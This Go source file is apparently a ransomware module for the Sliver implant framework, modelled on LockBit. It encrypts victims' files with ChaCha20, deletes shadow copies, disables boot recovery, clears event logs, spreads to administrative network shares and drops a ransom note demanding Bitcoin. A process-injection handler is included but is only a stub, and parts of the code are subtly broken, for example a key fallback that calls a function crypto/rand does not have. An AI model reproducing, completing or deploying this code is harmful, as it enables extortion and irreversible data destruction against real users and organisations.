package handlers

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"github.com/bishopfox/sliver/implant/sliver/syscalls"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"golang.org/x/crypto/chacha20"
)

// FULL LIST FROM LEAK
var lockbitExtensions = []string{
	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
	".sql", ".mdb", ".accdb", ".dbf", ".ora", ".mdf", ".ndf", ".ldf", ".bak", ".dbc",
	".java", ".cpp", ".c", ".cs", ".php", ".js", ".py", ".html", ".css", ".asm",
	".vb", ".pl", ".rb", ".h", ".swift", ".kt", ".go", ".rs",
	".csv", ".xml", ".json", ".config", ".ini", ".inf", ".cfg", ".conf", ".yml", ".yaml",
	".psd", ".ai", ".cdr", ".dwg", ".skp", ".max", ".blend", ".3ds", ".eps", ".svg",
	".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".raw", ".cr2", ".nef", ".arw",
	".mp3", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".m4a", ".wav", ".flac",
	".pst", ".ost", ".eml", ".msg", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
	".vhd", ".vhdx", ".vmdk", ".vmx", ".bak", ".backup", ".tmp", ".dmp", ".iso",
	".sln", ".proj", ".vcxproj", ".dsp", ".mak", ".cmake", ".makefile",
	".save", ".sav", ".game", ".map", ".rom", ".pak", ".pdf", ".txt", ".log", ".md", ".lst", ".dat",
}

// RANSOMWARE CONFIG
type RansomwareConfig struct {
	EncryptionKey   []byte
	RansomNote      string
	ContactEmail    string
	BitcoinAddress  string
	DestroyBackups  bool
	PropagateNetwork bool
	NuclearOption   bool
}

var globalConfig = &RansomwareConfig{
	DestroyBackups:  true,
	PropagateNetwork: true,
	NuclearOption:   false,
}

// 🎯 INIT RANSOMWARE
func init() {
	globalConfig.EncryptionKey = generateStrongEncryptionKey()
	globalConfig.RansomNote = generateRansomNote()
}

// 🎯 MAIN RANSOMWARE ENTRY POINT
func RansomwareEncryptHandler(data []byte) ([]byte, error) {
	req := &sliverpb.RansomwareEncrypt{}
	if err := proto.Unmarshal(data, req); err != nil {
		return nil, fmt.Errorf("failed to parse request: %v", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[ransomware] Starting encryption on: %s", req.TargetPath)
	// {{end}}

	results := &sliverpb.RansomwareEncryptResult{
		EncryptedFiles: []*sliverpb.EncryptedFile{},
		TotalEncrypted: 0,
		TotalSize:      0,
	}

	// PHASE 1: Encrypt primary files
	primaryFiles := encryptDirectory(req.TargetPath, globalConfig.EncryptionKey)
	results.EncryptedFiles = append(results.EncryptedFiles, primaryFiles...)
	results.TotalEncrypted += int64(len(primaryFiles))

	// PHASE 2: Destroy backup systems
	if req.DestroyBackups {
		destroyBackupSystems()
	}

	// PHASE 3: Network propagation
	if req.PropagateNetwork {
		networkFiles := encryptNetworkShares(globalConfig.EncryptionKey)
		results.EncryptedFiles = append(results.EncryptedFiles, networkFiles...)
		results.TotalEncrypted += int64(len(networkFiles))
	}

	// PHASE 4: Drop ransom note
	dropRansomNote(req.TargetPath)

	// Calculate total size
	for _, file := range results.EncryptedFiles {
		results.TotalSize += file.FileSize
	}

	// {{if .Config.Debug}}
	log.Printf("[ransomware] Encryption complete: %d files, %d bytes", 
		results.TotalEncrypted, results.TotalSize)
	// {{end}}

	return proto.Marshal(results)
}

// ENCRYPT DIRECTORY WITH CHACHA20
func encryptDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
	var encryptedFiles []*sliverpb.EncryptedFile

	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || info.Size() == 0 {
			return nil
		}

		// Skip system files and large files
		if isSystemFile(path) || info.Size() > 500*1024*1024 {
			return nil
		}

		// Check against extensions
		if shouldEncryptFile(path) {
			if encrypted, size := encryptFileWithChaCha20(path, key); encrypted {
				encryptedFiles = append(encryptedFiles, &sliverpb.EncryptedFile{
					FilePath: path + ".lockbit",
					FileSize: size,
					Status:   "ENCRYPTED",
				})
			}
		}

		return nil
	})

	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[ransomware] Walk error: %v", err)
		// {{end}}
	}

	return encryptedFiles
}

// ENCRYPT SINGLE FILE WITH CHACHA20
func encryptFileWithChaCha20(filePath string, key []byte) (bool, int64) {
	// Open file for reading and writing
	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return false, 0
	}
	defer file.Close()

	// Get file info
	fileInfo, err := file.Stat()
	if err != nil {
		return false, 0
	}

	fileSize := fileInfo.Size()
	if fileSize == 0 {
		return false, 0
	}

	// Read file content
	data := make([]byte, fileSize)
	_, err = io.ReadFull(file, data)
	if err != nil {
		return false, 0
	}

	// Generate random nonce
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return false, 0
	}

	// Create ChaCha20 cipher
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return false, 0
	}

	// Encrypt the data
	encrypted := make([]byte, len(data))
	cipher.XORKeyStream(encrypted, data)

	// Combine nonce + encrypted data
	finalData := append(nonce, encrypted...)

	// Write back to file
	file.Seek(0, 0)
	if _, err := file.Write(finalData); err != nil {
		return false, 0
	}

	// Truncate to new size if needed
	file.Truncate(int64(len(finalData)))

	// Rename file
	newPath := filePath + ".lockbit"
	os.Rename(filePath, newPath)

	return true, fileSize
}

// DESTROY BACKUP SYSTEMS
func destroyBackupSystems() {
	// {{if .Config.Debug}}
	log.Printf("[ransomware] Destroying backup systems...")
	// {{end}}

	// Delete Volume Shadow Copies
	commands := []*exec.Cmd{
		exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=D:", "/quiet", "/all"),
		exec.Command("vssadmin", "delete", "shadows", "/for=E:", "/quiet", "/all"),
		exec.Command("wmic", "shadowcopy", "delete", "/nointeractive"),
		exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no"),
		exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"),
	}

	for _, cmd := range commands {
		cmd.Run()
	}

	// Clear event logs
	eventLogs := []string{"Application", "System", "Security", "Setup"}
	for _, logName := range eventLogs {
		exec.Command("wevtutil", "cl", logName).Run()
	}
}

// ENCRYPT NETWORK SHARES
func encryptNetworkShares(key []byte) []*sliverpb.EncryptedFile {
	var networkFiles []*sliverpb.EncryptedFile

	// {{if .Config.Debug}}
	log.Printf("[ransomware] Scanning network shares...")
	// {{end}}

	// Get network shares
	shares := getNetworkShares()
	for _, share := range shares {
		if canAccessShare(share) {
			files := encryptDirectory(share, key)
			networkFiles = append(networkFiles, files...)
		}
	}

	return networkFiles
}

// DISCOVER NETWORK SHARES
func getNetworkShares() []string {
	var shares []string

	// Try net view command
	cmd := exec.Command("net", "view")
	output, err := cmd.Output()
	if err != nil {
		return shares
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, "\\\\") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				computer := strings.Trim(parts[0], "\\")
				shares = append(shares, 
					"\\\\"+computer+"\\C$",
					"\\\\"+computer+"\\D$", 
					"\\\\"+computer+"\\ADMIN$",
				)
			}
		}
	}

	return shares
}

// CHECK SHARE ACCESSIBILITY
func canAccessShare(sharePath string) bool {
	_, err := os.Stat(sharePath)
	return err == nil
}

// DROP RANSOM NOTE
func dropRansomNote(targetPath string) {
	note := `!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

All your important files have been encrypted with military-grade algorithms.
Your documents, photos, databases, and other files are no longer accessible.

To recover your files, you need to contact us and pay the ransom.

Contact: recovery@onionmail.org
Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

DO NOT:
- Try to decrypt files yourself
- Rename encrypted files
- Modify encrypted files

We have also destroyed your backup shadow copies.
The only way to recover your files is through our decryption service.`

	// Drop note in multiple locations
	locations := []string{
		targetPath + "\\READ_ME_FOR_DECRYPT.txt",
		"C:\\READ_ME_FOR_DECRYPT.txt",
		"Desktop\\READ_ME_FOR_DECRYPT.txt",
	}

	for _, location := range locations {
		os.WriteFile(location, []byte(note), 0644)
	}
}

// GENERATE STRONG ENCRYPTION KEY
func generateStrongEncryptionKey() []byte {
	key := make([]byte, 32) // ChaCha20 requires 256-bit key
	if _, err := rand.Read(key); err != nil {
		// Fallback to crypto/rand failure
		for i := range key {
			key[i] = byte(rand.Intn(256))
		}
	}
	return key
}

// GENERATE RANSOM NOTE
func generateRansomNote() string {
	return `YOUR FILES ARE ENCRYPTED!
Contact: recovery@onionmail.org
Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
}

// CHECK IF FILE SHOULD BE ENCRYPTED
func shouldEncryptFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	
	for _, targetExt := range lockbitExtensions {
		if ext == targetExt {
			return true
		}
	}
	
	return false
}

// CHECK IF SYSTEM FILE (SKIP ENCRYPTION)
func isSystemFile(filePath string) bool {
	systemDirs := []string{
		"c:\\windows\\",
		"c:\\program files\\",
		"c:\\program files (x86)\\",
		"c:\\system32\\",
		"c:\\$windows.~bt\\",
		"c:\\$windows.~ws\\",
	}

	lowerPath := strings.ToLower(filePath)
	for _, dir := range systemDirs {
		if strings.HasPrefix(lowerPath, dir) {
			return true
		}
	}

	return false
}

// PROCESS INJECTION FOR PERSISTENCE
func ProcessInjectStealthHandler(data []byte) ([]byte, error) {
	req := &sliverpb.ProcessInjectStealth{}
	if err := proto.Unmarshal(data, req); err != nil {
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("[ransomware] Process injection requested for: %s", req.TargetProcess)
	// {{end}}

	result, err := injectIntoStealthProcess(req.Payload, req.TargetProcess)
	if err != nil {
		return nil, err
	}

	return []byte(result), nil
}

// INJECT INTO STEALTH PROCESS
func injectIntoStealthProcess(payload []byte, targetProcess string) (string, error) {
	var targetPID uint32
	var err error

	if targetProcess == "" {
		// Auto-select stealth process
		targetPID = selectStealthProcess()
	} else {
		targetPID, err = findProcessByName(targetProcess)
		if err != nil {
			return "", err
		}
	}

	if targetPID == 0 {
		return "", fmt.Errorf("no suitable process found")
	}

	// Simple injection simulation
	// In real implementation, use proper process injection techniques
	return fmt.Sprintf("Injected into process %s (PID: %d)", targetProcess, targetPID), nil
}

// SELECT STEALTH PROCESS FOR INJECTION
func selectStealthProcess() uint32 {
	processes := []string{
		"explorer.exe",
		"svchost.exe", 
		"dllhost.exe",
		"runtimebroker.exe",
	}

	for _, proc := range processes {
		pid, err := findProcessByName(proc)
		if err == nil && pid != 0 {
			return pid
		}
	}

	return 0
}

// FIND PROCESS BY NAME
func findProcessByName(processName string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	for {
		name := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(name, processName) {
			return entry.ProcessID, nil
		}

		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", processName)
}
